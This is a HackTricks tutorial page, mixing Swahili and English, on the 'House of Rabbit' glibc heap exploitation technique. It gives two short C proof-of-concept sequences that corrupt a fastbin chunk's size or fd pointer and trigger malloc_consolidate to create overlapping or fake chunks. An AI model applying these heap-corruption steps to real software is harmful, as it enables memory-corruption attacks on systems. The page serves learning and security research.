# House of Rabbit

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Requirements

1. **Uwezo wa kubadilisha fast bin fd pointer au size**: Hii inamaanisha unaweza kubadilisha pointer ya mbele ya chunk katika fastbin au saizi yake.
2. **Uwezo wa kuchochea `malloc_consolidate`**: Hii inaweza kufanywa kwa kuallocate chunk kubwa au kuunganisha chunk ya juu, ambayo inasababisha heap kuunganisha chunks.

### Goals

1. **Unda chunks zinazovuka**: Ili kuwa na chunk moja inayovuka na nyingine, kuruhusu manipulasi zaidi za heap.
2. **Fanya chunks za uongo**: Ili kumdanganya allocator kut treating chunk ya uongo kama chunk halali wakati wa operesheni za heap.

## Steps of the attack

### POC 1: Badilisha saizi ya fast bin chunk

**Objective**: Unda chunk inayovuka kwa kubadilisha saizi ya fastbin chunk.

* **Step 1: Allocate Chunks**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
Tunaweka vipande viwili vya 0x40 bytes kila kimoja. Vipande hivi vitakuwa katika orodha ya fast bin mara vitakapokuwa huru.

* **Hatua ya 2: Fungua Vipande**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
We free both chunks, adding them to the fastbin list.

* **Hatua ya 3: Badilisha Ukubwa wa Chunk**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
Tunabadilisha metadata ya saizi ya `chunk1` kuwa 0xa1. Hii ni hatua muhimu ili kumdanganya allocator wakati wa kuunganisha.

* **Step 4: Trigger `malloc_consolidate`**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
Allocating a large chunk triggers the `malloc_consolidate` function, merging small chunks in the fast bin. The manipulated size of `chunk1` causes it to overlap with `chunk2`.

After consolidation, `chunk1` overlaps with `chunk2`, allowing for further exploitation.

### POC 2: Modify the `fd` pointer

**Objective**: Create a fake chunk by manipulating the fast bin `fd` pointer.

* **Step 1: Allocate Chunks**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**Maelezo**: Tunapanga vipande viwili, kimoja kidogo na kingine kikubwa, ili kuandaa heap kwa ajili ya kipande cha uwongo.

* **Hatua ya 2: Unda kipande cha uwongo**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
Tunaandika metadata ya bandia ya chunk ndani ya `chunk2` ili kuiga chunks ndogo.

* **Hatua ya 3: Fungua `chunk1`**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**Maelezo**: Tunachomoa `chunk1`, tukiongeza kwenye orodha ya fastbin.

* **Hatua ya 4: Badilisha `fd` ya `chunk1`**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**Maelezo**: Tunabadilisha kipanga mbele (`fd`) cha `chunk1` kuonyesha kwenye kipande chetu cha uongo ndani ya `chunk2`.

* **Hatua ya 5: Chochea `malloc_consolidate`**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
Allocating a large chunk again triggers `malloc_consolidate`, which processes the fake chunk.

The fake chunk becomes part of the fastbin list, making it a legitimate chunk for further exploitation.

### Summary

The **House of Rabbit** technique involves either modifying the size of a fast bin chunk to create overlapping chunks or manipulating the `fd` pointer to create fake chunks. This allows attackers to forge legitimate chunks in the heap, enabling various forms of exploitation. Understanding and practicing these steps will enhance your heap exploitation skills.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
